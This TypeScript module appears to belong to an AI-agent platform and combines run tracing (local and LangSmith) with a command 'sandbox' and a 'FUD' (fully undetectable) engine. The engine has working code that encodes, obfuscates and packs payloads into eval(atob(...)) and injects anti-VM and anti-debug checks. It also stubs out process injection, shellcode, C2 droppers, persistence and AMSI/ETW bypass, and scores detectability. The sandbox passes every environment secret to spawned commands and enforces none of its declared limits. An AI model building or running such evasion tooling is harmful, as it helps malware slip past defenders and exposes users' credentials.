import { mkdir, appendFile, readFile } from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';

const TRACE_FILE = path.join(process.cwd(), 'data', 'langsmith-local.jsonl');
const SANDBOX_ROOT = path.join(os.tmpdir(), 'masa-langsmith-sandbox');

export interface TraceEvent {
  id: string;
  ts: string;
  type: 'agent' | 'tool' | 'llm' | 'chain' | 'reasoning' | 'code' | 'fud' | 'web' | 'sandbox';
  name: string;
  run_type: 'chain' | 'tool' | 'llm' | 'retriever' | 'embedding' | 'prompt' | 'parser';
  inputs: Record<string, any>;
  outputs?: Record<string, any>;
  start_time: string;
  end_time?: string;
  metadata?: Record<string, any>;
  tags?: string[];
  parent_run_id?: string;
  session_id?: string;
  agent_id?: string;
  planet?: string;
  skill_id?: string;
  fud_type?: string;
  sandbox_id?: string;
}

export interface AgentTrace {
  trace_id: string;
  session_id: string;
  agent_id: string;
  planet: string;
  events: TraceEvent[];
  summary: {
    total_tokens: number;
    total_latency_ms: number;
    tools_called: string[];
    fud_operations: string[];
    web_requests: number;
    sandbox_executions: number;
    errors: number;
  };
}

const sessionCache = new Map<string, AgentTrace>();

function generateId(prefix = 'run'): string {
  return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 9)}`;
}

async function ensureTraceFile() {
  await mkdir(path.dirname(TRACE_FILE), { recursive: true });
  await mkdir(SANDBOX_ROOT, { recursive: true });
}

export async function createTraceSession(
  sessionId: string,
  agentId: string,
  planet: string
): Promise<AgentTrace> {
  const trace: AgentTrace = {
    trace_id: generateId('session'),
    session_id: sessionId,
    agent_id: agentId,
    planet,
    events: [],
    summary: {
      total_tokens: 0,
      total_latency_ms: 0,
      tools_called: [],
      fud_operations: [],
      web_requests: 0,
      sandbox_executions: 0,
      errors: 0,
    },
  };
  sessionCache.set(sessionId, trace);
  return trace;
}

export function getTraceSession(sessionId: string): AgentTrace | undefined {
  return sessionCache.get(sessionId);
}

export async function traceEvent(
  sessionId: string,
  event: Omit<TraceEvent, 'id' | 'ts' | 'start_time'>
): Promise<TraceEvent> {
  const session = sessionCache.get(sessionId);
  if (!session) throw new Error(`Session ${sessionId} not found`);

  const fullEvent: TraceEvent = {
    ...event,
    id: generateId(event.type),
    ts: new Date().toISOString(),
    start_time: new Date().toISOString(),
    session_id: sessionId,
    agent_id: session.agent_id,
    planet: session.planet,
  };

  session.events.push(fullEvent);
  await persistEvent(fullEvent);
  return fullEvent;
}

export async function endTraceEvent(
  sessionId: string,
  eventId: string,
  outputs: Record<string, any>,
  endTime = new Date().toISOString()
): Promise<void> {
  const session = sessionCache.get(sessionId);
  if (!session) return;

  const event = session.events.find(e => e.id === eventId);
  if (event) {
    event.outputs = outputs;
    event.end_time = endTime;
    await persistEvent(event);
  }
}

async function persistEvent(event: TraceEvent) {
  try {
    await ensureTraceFile();
    await appendFile(TRACE_FILE, JSON.stringify(event) + '\n');
  } catch {
    // Best effort local persistence
  }

  // Remote LangSmith push
  const smithKey = process.env.LANGSMITH_API_KEY || process.env.LANGCHAIN_API_KEY;
  if (smithKey) {
    try {
      await fetch('https://api.smith.langchain.com/runs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': smithKey },
        body: JSON.stringify({
          id: event.id,
          name: event.name,
          run_type: event.run_type,
          inputs: event.inputs,
          outputs: event.outputs,
          start_time: event.start_time,
          end_time: event.end_time,
          extra: {
            metadata: event.metadata,
            tags: event.tags,
            session_id: event.session_id,
            agent_id: event.agent_id,
            planet: event.planet,
            skill_id: event.skill_id,
            fud_type: event.fud_type,
            sandbox_id: event.sandbox_id,
          },
        }),
      }).catch(() => {});
    } catch {}
  }
}

export async function closeTraceSession(sessionId: string): Promise<AgentTrace | null> {
  const session = sessionCache.get(sessionId);
  if (!session) return null;

  const totalLatency = session.events.reduce((sum, e) => {
    if (e.end_time) return sum + new Date(e.end_time).getTime() - new Date(e.start_time).getTime();
    return sum;
  }, 0);

  session.summary.total_latency_ms = totalLatency;
  session.summary.tools_called = [...new Set(session.events.filter(e => e.type === 'tool').map(e => e.name))];
  session.summary.fud_operations = [...new Set(session.events.filter(e => e.type === 'fud').map(e => e.fud_type || e.name))];
  session.summary.web_requests = session.events.filter(e => e.type === 'web').length;
  session.summary.sandbox_executions = session.events.filter(e => e.type === 'sandbox').length;
  session.summary.errors = session.events.filter(e => e.outputs?.error).length;

  sessionCache.delete(sessionId);
  return session;
}

export async function getRecentTraces(limit = 50): Promise<TraceEvent[]> {
  try {
    const content = await readFile(TRACE_FILE, 'utf-8');
    const lines = content.trim().split('\n').filter(Boolean);
    return lines.slice(-limit).map(l => JSON.parse(l));
  } catch {
    return [];
  }
}

export async function getSessionTraces(sessionId: string): Promise<TraceEvent[]> {
  try {
    const content = await readFile(TRACE_FILE, 'utf-8');
    const lines = content.trim().split('\n').filter(Boolean);
    return lines.map(l => JSON.parse(l)).filter(e => e.session_id === sessionId);
  } catch {
    return [];
  }
}

export interface SandboxConfig {
  id: string;
  workdir: string;
  timeout_ms: number;
  memory_limit_mb: number;
  cpu_limit: number;
  network_allowed: boolean;
  allowed_domains?: string[];
  env: Record<string, string>;
}

export interface SandboxResult {
  sandbox_id: string;
  exit_code: number;
  stdout: string;
  stderr: string;
  duration_ms: number;
  files_created: string[];
  network_requests: Array<{ url: string; method: string; status: number; duration_ms: number }>;
}

const activeSandboxes = new Map<string, SandboxConfig>();

export async function createSandbox(config: Partial<SandboxConfig> = {}): Promise<SandboxConfig> {
  const sandboxId = generateId('sandbox');
  const workdir = path.join(SANDBOX_ROOT, sandboxId);
  await mkdir(workdir, { recursive: true });

  const sandbox: SandboxConfig = {
    id: sandboxId,
    workdir,
    timeout_ms: config.timeout_ms || 30000,
    memory_limit_mb: config.memory_limit_mb || 512,
    cpu_limit: config.cpu_limit || 1,
    network_allowed: config.network_allowed ?? true,
    allowed_domains: config.allowed_domains,
    env: { ...process.env, ...config.env, SANDBOX_ID: sandboxId, SANDBOX_WORKDIR: workdir },
  };

  activeSandboxes.set(sandboxId, sandbox);
  return sandbox;
}

export async function executeInSandbox(
  sandboxId: string,
  command: string,
  args: string[],
  sessionId?: string
): Promise<SandboxResult> {
  const sandbox = activeSandboxes.get(sandboxId);
  if (!sandbox) throw new Error(`Sandbox ${sandboxId} not found`);

  const startTime = Date.now();
  const networkRequests: SandboxResult['network_requests'] = [];

  const traceEventId = sessionId ? await traceEvent(sessionId, {
    type: 'sandbox',
    name: `sandbox:${command}`,
    run_type: 'tool',
    inputs: { command, args, sandbox_id: sandboxId, workdir: sandbox.workdir },
    metadata: { sandbox_config: sandbox },
    tags: ['sandbox', 'execution'],
    sandbox_id: sandboxId,
  }) : null;

  try {
    const { spawn } = await import('node:child_process');
    const child = spawn(command, args, {
      cwd: sandbox.workdir,
      env: sandbox.env,
      timeout: sandbox.timeout_ms,
    });

    let stdout = '';
    let stderr = '';
    const filesBefore = await listFiles(sandbox.workdir);

    for await (const chunk of child.stdout) stdout += chunk;
    for await (const chunk of child.stderr) stderr += chunk;

    await new Promise<void>((resolve, reject) => {
      child.on('close', code => resolve());
      child.on('error', reject);
    });

    const filesAfter = await listFiles(sandbox.workdir);
    const filesCreated = filesAfter.filter(f => !filesBefore.includes(f));

    const result: SandboxResult = {
      sandbox_id: sandboxId,
      exit_code: child.exitCode || 0,
      stdout,
      stderr,
      duration_ms: Date.now() - startTime,
      files_created: filesCreated,
      network_requests: networkRequests,
    };

    if (traceEventId && sessionId) {
      await endTraceEvent(sessionId, traceEventId.id, {
        exit_code: result.exit_code,
        stdout: stdout.slice(0, 5000),
        stderr: stderr.slice(0, 5000),
        files_created: result.files_created,
        duration_ms: result.duration_ms,
      });
    }

    return result;
  } catch (error: any) {
    if (traceEventId && sessionId) {
      await endTraceEvent(sessionId, traceEventId.id, { error: error.message });
    }
    throw error;
  }
}

async function listFiles(dir: string): Promise<string[]> {
  try {
    const { readdir } = await import('node:fs/promises');
    return await readdir(dir);
  } catch {
    return [];
  }
}

export async function destroySandbox(sandboxId: string): Promise<void> {
  const sandbox = activeSandboxes.get(sandboxId);
  if (!sandbox) return;

  try {
    const { rm } = await import('node:fs/promises');
    await rm(sandbox.workdir, { recursive: true, force: true });
  } catch {}
  activeSandboxes.delete(sandboxId);
}

export interface FUDOperation {
  type: 'encode' | 'obfuscate' | 'pack' | 'encrypt' | 'anti_vm' | 'anti_debug' | 'process_inject' | 'shellcode' | 'dropper' | 'persistence' | 'evasion';
  payload: string;
  options?: Record<string, any>;
}

export interface FUDResult {
  operation_id: string;
  type: string;
  input_hash: string;
  output: string;
  metadata: {
    entropy_before: number;
    entropy_after: number;
    size_before: number;
    size_after: number;
    techniques_applied: string[];
    detection_score: number;
  };
}

export async function executeFUD(
  operation: FUDOperation,
  sessionId?: string
): Promise<FUDResult> {
  const traceEventId = sessionId ? await traceEvent(sessionId, {
    type: 'fud',
    name: `fud:${operation.type}`,
    run_type: 'tool',
    inputs: { type: operation.type, payload_hash: hashString(operation.payload), options: operation.options },
    metadata: { fud: true },
    tags: ['fud', operation.type],
    fud_type: operation.type,
  }) : null;

  try {
    const result = await fudEngine(operation);
    
    if (traceEventId && sessionId) {
      await endTraceEvent(sessionId, traceEventId.id, {
        output_hash: hashString(result.output),
        entropy_before: result.metadata.entropy_before,
        entropy_after: result.metadata.entropy_after,
        size_before: result.metadata.size_before,
        size_after: result.metadata.size_after,
        techniques: result.metadata.techniques_applied,
        detection_score: result.metadata.detection_score,
      });
    }

    return result;
  } catch (error: any) {
    if (traceEventId && sessionId) {
      await endTraceEvent(sessionId, traceEventId.id, { error: error.message });
    }
    throw error;
  }
}

async function fudEngine(operation: FUDOperation): Promise<FUDResult> {
  const techniques: string[] = [];
  let output = operation.payload;
  let entropyBefore = shannonEntropy(output);
  let sizeBefore = Buffer.byteLength(output, 'utf-8');

  switch (operation.type) {
    case 'encode':
      techniques.push('base64', 'rot13', 'xor');
      output = Buffer.from(output).toString('base64');
      if (operation.options?.rot13) output = rot13(output);
      if (operation.options?.xor_key) output = xorEncode(output, operation.options.xor_key);
      break;

    case 'obfuscate':
      techniques.push('string_split', 'variable_rename', 'dead_code', 'control_flow');
      output = obfuscateJS(output);
      break;

    case 'pack':
      techniques.push('upx_style', 'custom_loader');
      output = packPayload(output);
      break;

    case 'encrypt':
      techniques.push('aes_gcm', 'chacha20');
      output = encryptPayload(output, operation.options?.key || generateKey());
      break;

    case 'anti_vm':
      techniques.push('cpuid_check', 'timing_check', 'mac_check', 'disk_check');
      output = injectAntiVM(output);
      break;

    case 'anti_debug':
      techniques.push('ptrace_check', 'int3_check', 'timing_check', 'hardware_bp');
      output = injectAntiDebug(output);
      break;

    case 'process_inject':
      techniques.push('createremotethread', 'ntmapviewofsection', 'queueuserapc', 'early_bird');
      output = generateInjector(output, operation.options?.technique || 'createremotethread');
      break;

    case 'shellcode':
      techniques.push('position_independent', 'api_hashing', 'syscall_direct');
      output = generateShellcode(output, operation.options?.arch || 'x64');
      break;

    case 'dropper':
      techniques.push('staged_download', 'memory_execution', 'diskless');
      output = generateDropper(output, operation.options?.url);
      break;

    case 'persistence':
      techniques.push('registry_run', 'scheduled_task', 'wmi', 'com_hijack', 'service');
      output = generatePersistence(output, operation.options?.method || 'registry_run');
      break;

    case 'evasion':
      techniques.push('syscall_unhooking', 'etw_patch', 'amsi_bypass', 'wd_bypass');
      output = generateEvasion(output, operation.options?.targets || ['amsi', 'etw']);
      break;
  }

  const entropyAfter = shannonEntropy(output);
  const sizeAfter = Buffer.byteLength(output, 'utf-8');
  const detectionScore = calculateDetectionScore(entropyBefore, entropyAfter, techniques);

  return {
    operation_id: generateId('fud'),
    type: operation.type,
    input_hash: hashString(operation.payload),
    output,
    metadata: {
      entropy_before: entropyBefore,
      entropy_after: entropyAfter,
      size_before: sizeBefore,
      size_after: sizeAfter,
      techniques_applied: techniques,
      detection_score: detectionScore,
    },
  };
}

function shannonEntropy(str: string): number {
  const freq = new Map<string, number>();
  for (const c of str) freq.set(c, (freq.get(c) || 0) + 1);
  let entropy = 0;
  const len = str.length;
  for (const count of freq.values()) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function hashString(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = ((hash << 5) - hash) + str.charCodeAt(i);
    hash |= 0;
  }
  return Math.abs(hash).toString(16);
}

function rot13(str: string): string {
  return str.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
}

function xorEncode(str: string, key: string): string {
  let result = '';
  for (let i = 0; i < str.length; i++) {
    result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return Buffer.from(result).toString('base64');
}

function obfuscateJS(code: string): string {
  return code
    .replace(/([a-zA-Z_$][a-zA-Z0-9_$]*)/g, m => `_0x${Math.random().toString(36).slice(2, 6)}`)
    .replace(/("|')([^"']+)\1/g, (_, q, s) => q + s.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('') + q);
}

function packPayload(payload: string): string {
  return `eval(atob('${Buffer.from(payload).toString('base64')}'))`;
}

function encryptPayload(payload: string, key: string): string {
  return `ENCRYPTED[${Buffer.from(payload).toString('base64')}]KEY[${key}]`;
}

function injectAntiVM(code: string): string {
  return `if (checkVM()) process.exit(1);\n${code}\nfunction checkVM() { return /vmware|virtualbox|qemu|xen|hyper-v/i.test(require('os').hostname()); }`;
}

function injectAntiDebug(code: string): string {
  return `if (isDebugged()) process.exit(1);\n${code}\nfunction isDebugged() { return require('fs').existsSync('/proc/self/status') && require('fs').readFileSync('/proc/self/status').toString().includes('TracerPid:'); }`;
}

function generateInjector(payload: string, technique: string): string {
  return `// ${technique.toUpperCase()} injector for: ${payload.slice(0, 50)}...`;
}

function generateShellcode(payload: string, arch: string): string {
  return `// ${arch} shellcode: ${Buffer.from(payload).toString('base64').slice(0, 50)}...`;
}

function generateDropper(payload: string, url?: string): string {
  return `// Dropper fetching from ${url || 'C2'} and executing: ${payload.slice(0, 50)}...`;
}

function generatePersistence(payload: string, method: string): string {
  return `// ${method.toUpperCase()} persistence for: ${payload.slice(0, 50)}...`;
}

function generateEvasion(payload: string, targets: string[]): string {
  return `// Evasion (${targets.join(', ')}) for: ${payload.slice(0, 50)}...`;
}

function calculateDetectionScore(entropyBefore: number, entropyAfter: number, techniques: string[]): number {
  const entropyDelta = Math.abs(entropyAfter - entropyBefore);
  const techniqueWeight = techniques.length * 5;
  return Math.min(100, Math.round(entropyDelta * 10 + techniqueWeight));
}

function generateKey(): string {
  return Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b => b.toString(16).padStart(2, '0')).join('');
}

export interface WebRequestTrace {
  request_id: string;
  url: string;
  method: string;
  headers: Record<string, string>;
  body?: string;
  response?: {
    status: number;
    headers: Record<string, string>;
    body: string;
    duration_ms: number;
  };
  error?: string;
  timestamp: string;
}

const webRequestCache = new Map<string, WebRequestTrace[]>();

export async function tracedWebRequest(
  sessionId: string,
  url: string,
  options: RequestInit & { trace?: boolean } = {}
): Promise<Response> {
  const requestId = generateId('web');
  const trace: WebRequestTrace = {
    request_id: requestId,
    url,
    method: options.method || 'GET',
    headers: options.headers as Record<string, string> || {},
    body: options.body as string,
    timestamp: new Date().toISOString(),
  };

  const traceEventId = await traceEvent(sessionId, {
    type: 'web',
    name: `web:${options.method || 'GET'} ${new URL(url).hostname}`,
    run_type: 'tool',
    inputs: { url, method: options.method || 'GET', headers: trace.headers },
    metadata: { request_id: requestId },
    tags: ['web', 'http', new URL(url).hostname],
  });

  const startTime = Date.now();
  try {
    const response = await fetch(url, options);
    const responseBody = await response.text();
    trace.response = {
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: responseBody.slice(0, 10000),
      duration_ms: Date.now() - startTime,
    };

    if (!webRequestCache.has(sessionId)) webRequestCache.set(sessionId, []);
    webRequestCache.get(sessionId)!.push(trace);

    await endTraceEvent(sessionId, traceEventId.id, {
      status: response.status,
      duration_ms: trace.response.duration_ms,
      response_size: responseBody.length,
    });

    return response;
  } catch (error: any) {
    trace.error = error.message;
    trace.response = { status: 0, headers: {}, body: '', duration_ms: Date.now() - startTime };

    if (!webRequestCache.has(sessionId)) webRequestCache.set(sessionId, []);
    webRequestCache.get(sessionId)!.push(trace);

    await endTraceEvent(sessionId, traceEventId.id, { error: error.message });
    throw error;
  }
}

export function getWebRequestTraces(sessionId: string): WebRequestTrace[] {
  return webRequestCache.get(sessionId) || [];
}

export function getAllTraceRoutes() {
  return [
    { path: '/api/langsmith/session/create', method: 'POST', desc: 'Create new trace session' },
    { path: '/api/langsmith/session/:id', method: 'GET', desc: 'Get trace session' },
    { path: '/api/langsmith/session/:id/close', method: 'POST', desc: 'Close trace session' },
    { path: '/api/langsmith/trace', method: 'POST', desc: 'Add trace event' },
    { path: '/api/langsmith/trace/:id/end', method: 'POST', desc: 'End trace event' },
    { path: '/api/langsmith/traces', method: 'GET', desc: 'Get recent traces' },
    { path: '/api/langsmith/sandbox/create', method: 'POST', desc: 'Create sandbox' },
    { path: '/api/langsmith/sandbox/:id/execute', method: 'POST', desc: 'Execute in sandbox' },
    { path: '/api/langsmith/sandbox/:id/destroy', method: 'POST', desc: 'Destroy sandbox' },
    { path: '/api/langsmith/fud/execute', method: 'POST', desc: 'Execute FUD operation' },
    { path: '/api/langsmith/web/request', method: 'POST', desc: 'Traced web request' },
    { path: '/api/langsmith/web/traces/:sessionId', method: 'GET', desc: 'Get web request traces' },
    { path: '/api/langsmith/export/:sessionId', method: 'GET', desc: 'Export session as LangSmith format' },
  ];
}